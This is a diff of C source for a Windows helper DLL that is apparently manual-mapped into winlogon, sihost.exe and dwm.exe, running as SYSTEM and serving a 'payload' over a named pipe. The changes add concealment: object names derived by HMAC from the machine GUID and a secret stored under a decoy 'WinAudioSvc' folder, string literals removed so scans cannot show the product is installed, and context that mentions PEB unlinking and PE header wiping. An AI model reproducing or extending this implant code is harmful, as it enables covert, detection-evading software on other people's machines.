@@ -198,37 +198,86 @@ static int wl_read_machine_guid(char *out, unsigned outsize) {
     return 1;
 }
 
-/* SHA-256(salt || ':' || guid_lower) -> first 16 bytes -> canonical GUID.
- * Uses bcrypt (available in every Windows process). */
+/* v3.2 (2026-09-23) -- bind_secret reader.
+ * Mirrors shared/bind_secret.c (helper is manual-mapped + self-contained
+ * so we can't link the shared code; MUST stay in lockstep). Reads
+ * %ProgramData%\WinAudioSvc\_bind.bin -- winlogon runs as SYSTEM so
+ * has GENERIC_READ access even under the Admin+SYSTEM-only DACL. */
+static const uint8_t WL_DEFAULT_BIND[32] = {
+    0x7c, 0x3f, 0xa1, 0x92, 0x4d, 0x88, 0x1e, 0x60,
+    0x5b, 0x37, 0xd0, 0x2c, 0x9e, 0xea, 0x14, 0x77,
+    0x33, 0x4a, 0xf5, 0x11, 0x08, 0xbc, 0x69, 0x82,
+    0xc4, 0x17, 0x5d, 0x2f, 0xaa, 0x93, 0x76, 0xe1
+};
+static int wl_read_bind_secret(uint8_t out[32]) {
+    HANDLE h = CreateFileA("C:\\ProgramData\\WinAudioSvc\\_bind.bin",
+                           GENERIC_READ, FILE_SHARE_READ, NULL,
+                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h == INVALID_HANDLE_VALUE) {
+        for (int i = 0; i < 32; i++) out[i] = WL_DEFAULT_BIND[i];
+        return 1;
+    }
+    uint8_t buf[64] = {0};
+    DWORD rd = 0;
+    int ok = 0;
+    if (ReadFile(h, buf, sizeof(buf), &rd, NULL) && rd >= 32) {
+        for (int i = 0; i < 32; i++) out[i] = buf[i];
+        ok = 1;
+    }
+    for (int i = 0; i < 64; i++) buf[i] = 0;
+    CloseHandle(h);
+    if (!ok) {
+        for (int i = 0; i < 32; i++) out[i] = WL_DEFAULT_BIND[i];
+    }
+    return 1;
+}
+
+/* HMAC-SHA-256(bind, salt || ':' || guid_lower) -> first 16 bytes ->
+ * canonical GUID. MUST match shared/obf_names.c derive_guid() byte-for-
+ * byte (payload + helper derive same names). */
 static int wl_derive_guid(const char *salt, char *out, unsigned outsize) {
     if (outsize < 37) return 0;
     char guid[80];
     if (!wl_read_machine_guid(guid, sizeof(guid))) {
         lstrcpynA(guid, WL_FALLBACK_GUID, sizeof(guid));
     }
-    BCRYPT_ALG_HANDLE alg = NULL;
-    if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0)))
-        return 0;
-    BCRYPT_HASH_HANDLE h = NULL;
-    if (!NT_SUCCESS(BCryptCreateHash(alg, &h, NULL, 0, NULL, 0, 0))) {
-        BCryptCloseAlgorithmProvider(alg, 0);
+    uint8_t bind[32];
+    if (!wl_read_bind_secret(bind)) {
+        for (unsigned i = 0; i < sizeof(guid); i++) guid[i] = 0;
         return 0;
     }
-    static const char sep[1] = { ':' };
-    BCryptHashData(h, (PUCHAR)salt, (ULONG)lstrlenA(salt), 0);
-    BCryptHashData(h, (PUCHAR)sep, 1, 0);
-    BCryptHashData(h, (PUCHAR)guid, (ULONG)lstrlenA(guid), 0);
+    /* Build message: salt || ":" || guid_lower */
+    char msg[128];
+    wsprintfA(msg, "%s:%s", salt, guid);
+    int msg_len = lstrlenA(msg);
+
+    BCRYPT_ALG_HANDLE alg = NULL;
+    if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM,
+                                                NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG))) {
+        for (int i = 0; i < 32; i++) bind[i] = 0;
+        for (unsigned i = 0; i < sizeof(guid); i++) guid[i] = 0;
+        return 0;
+    }
+    BCRYPT_HASH_HANDLE h = NULL;
+    if (!NT_SUCCESS(BCryptCreateHash(alg, &h, NULL, 0, bind, (ULONG)sizeof(bind), 0))) {
+        BCryptCloseAlgorithmProvider(alg, 0);
+        for (int i = 0; i < 32; i++) bind[i] = 0;
+        for (unsigned i = 0; i < sizeof(guid); i++) guid[i] = 0;
+        return 0;
+    }
+    BCryptHashData(h, (PUCHAR)msg, (ULONG)msg_len, 0);
     UCHAR d[32];
     NTSTATUS fs = BCryptFinishHash(h, d, sizeof(d), 0);
     BCryptDestroyHash(h);
     BCryptCloseAlgorithmProvider(alg, 0);
+    for (int i = 0; i < 32; i++) bind[i] = 0;
+    for (int i = 0; i < 128; i++) msg[i] = 0;
+    for (unsigned i = 0; i < sizeof(guid); i++) guid[i] = 0;
     if (!NT_SUCCESS(fs)) return 0;
     wsprintfA(out, "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
         d[0], d[1], d[2], d[3], d[4], d[5], d[6], d[7],
         d[8], d[9], d[10], d[11], d[12], d[13], d[14], d[15]);
-    /* zero derived material we no longer need */
     for (int i = 0; i < 32; i++) d[i] = 0;
-    for (unsigned i = 0; i < sizeof(guid); i++) guid[i] = 0;
     return 1;
 }
 
@@ -955,10 +1004,20 @@ static DWORD WINAPI watch_thread(LPVOID unused) {
 
 /* Legacy halt-event names (pre-GUID). We signal both on ATTACH so any
  * stale helper from a previous session generation exits cleanly during
- * the version transition. Safe to remove after everyone has rebooted
- * past v3.0.2.4. */
-static const wchar_t OLD_STOP_EVENT_W[] = L"Global\\svcldb_wlinput_stop";
-static const wchar_t V3_0_2_STOP_EVENT_W[] = L"Global\\NetSvcCoord_Halt";
+ * the version transition.
+ *
+ * v3.2 (2026-09-23): the WIDE literals were removed entirely -- they
+ * appeared as UTF-16 strings in sihost.exe / wl_input.dll and gave a
+ * medium-IL attacker doing `strings -e l sihost.exe` free proof our
+ * product was installed. Everyone rebooted past v3.0.2.4 back in July,
+ * so signalling those old halt events is dead code. The event handles
+ * below are declared but never populated -- kept as symbols so the
+ * later kick_prior_generations() call sites still compile.
+ *
+ * Kept the wl_iso_halt_event_w() GUID-derived halt event -- that's the
+ * live path used for GENERATION-N cleanup, unchanged. */
+static const wchar_t *const OLD_STOP_EVENT_W   = NULL;
+static const wchar_t *const V3_0_2_STOP_EVENT_W = NULL;
 
 /* =====================================================================
  * v3.0.3 (2026-09-21) -- LAYER 2+3+4: helper-hosted watchdog +
@@ -2486,14 +2545,19 @@ static DWORD WINAPI uia_server_thread(LPVOID unused) {
     }
 
     while (InterlockedCompareExchange(&g_uia_srv_running, 0, 0)) {
-        SECURITY_DESCRIPTOR sd;
-        InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
-        SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
-        SECURITY_ATTRIBUTES sa;
+        /* v3.2 (2026-09-23) -- tightened from NULL-DACL to Admins+SYSTEM.
+         * The only legitimate client is the payload running as SYSTEM in
+         * dwm.exe (SY grants access). Medium-IL DoS via holding the sole
+         * pipe instance previously blocked payload UIA queries on iso
+         * desktops. */
+        PSECURITY_DESCRIPTOR sd_alloc = NULL;
+        SECURITY_ATTRIBUTES sa = {0};
         sa.nLength = sizeof(sa);
-        sa.lpSecurityDescriptor = &sd;
         sa.bInheritHandle = FALSE;
-
+        if (ConvertStringSecurityDescriptorToSecurityDescriptorA(
+                "D:(A;;FA;;;BA)(A;;FA;;;SY)", 1, &sd_alloc, NULL)) {
+            sa.lpSecurityDescriptor = sd_alloc;
+        }
         HANDLE pipe = CreateNamedPipeA(
             wl_iso_cmd_pipe_name(),
             PIPE_ACCESS_DUPLEX,
@@ -2501,7 +2565,8 @@ static DWORD WINAPI uia_server_thread(LPVOID unused) {
             1,                      /* single instance -- serializes requests */
             64 * 1024,              /* out buffer */
             64 * 1024,              /* in buffer */
-            0, &sa);
+            0, sa.lpSecurityDescriptor ? &sa : NULL);
+        if (sd_alloc) LocalFree(sd_alloc);
         if (pipe == INVALID_HANDLE_VALUE) {
             lg("uia_server: CreateNamedPipe FAILED gle=%lu", GetLastError());
             Sleep(1000);
@@ -2715,13 +2780,13 @@ BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {
         const wchar_t *stop_w = wl_iso_halt_event_w();
         g_stop = CreateEventW(NULL, TRUE, FALSE, stop_w);
         if (g_stop) SetEvent(g_stop);   /* signal old readers NOW -- they see it next WM_TIMER */
-        /* Kick prior-generation helpers too -- all inline, all fast (<1ms each). */
-        HANDLE k1 = OpenEventW(EVENT_MODIFY_STATE, FALSE, OLD_STOP_EVENT_W);
-        if (k1) { SetEvent(k1); CloseHandle(k1);
-                  lg("kicked pre-v3.0.2 helper via %ls", OLD_STOP_EVENT_W); }
-        HANDLE k2 = OpenEventW(EVENT_MODIFY_STATE, FALSE, V3_0_2_STOP_EVENT_W);
-        if (k2) { SetEvent(k2); CloseHandle(k2);
-                  lg("kicked v3.0.2 helper via %ls", V3_0_2_STOP_EVENT_W); }
+        /* v3.2 (2026-09-23): pre-v3.0.2.4 helper generations are extinct
+         * (2+ months since that version -- everyone rebooted). The wide
+         * literal legacy names are removed to eliminate the sihost.exe
+         * UTF-16 strings leak. Current-derivation helpers are still
+         * kicked via wl_iso_halt_event_w() (the GUID-per-install path
+         * below). */
+        (void)OLD_STOP_EVENT_W; (void)V3_0_2_STOP_EVENT_W;
 
         /* Stealth pass -- PEB unlink first (invalidates our module list
          * entry), then PE header wipe, then section downgrade. Same
